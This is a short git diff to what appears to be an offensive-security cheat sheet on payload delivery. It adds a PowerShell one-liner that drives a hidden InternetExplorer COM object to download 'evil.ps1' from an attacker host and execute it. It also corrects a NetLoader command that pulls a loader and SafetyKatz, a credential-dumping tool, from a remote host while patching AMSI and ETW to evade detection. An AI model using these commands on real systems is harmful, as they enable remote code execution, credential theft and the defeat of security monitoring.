@@ -44,8 +44,12 @@ $classrev = ([regx]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) - 
 - DefenderCheck
 
 #### Payload Delivery
-
-
+__Com Object__
+```powershell
+$x = New-Object -ComObject InternetExplorer.Application;$x.visible=$False;$x.navigate('$IP/evil.ps1');sleep 5;$r=$x.Document.body.innerHTML;$x.quit();iex $r
+```
+```powershel
+```
 
 ---
 ### Offensive C\#
@@ -85,7 +89,9 @@ __ConfuserEx (Rubeus.exe)__
 
 #### Payload Delivery
 __NetLoader__
-- Patches AMSI & ETW while excuting
+- Patches AMSI & ETW while executing
 ```powershell
-AssemblyLoad.exe $IP/Loader.exe -path $IP/safetykatz.e
+AssemblyLoad.exe $IP/Loader.exe -path $IP/safetykatz.exe
 ```
+- AssemblyLoader loads NetLoader which in turn loads safetykatz.exe
+
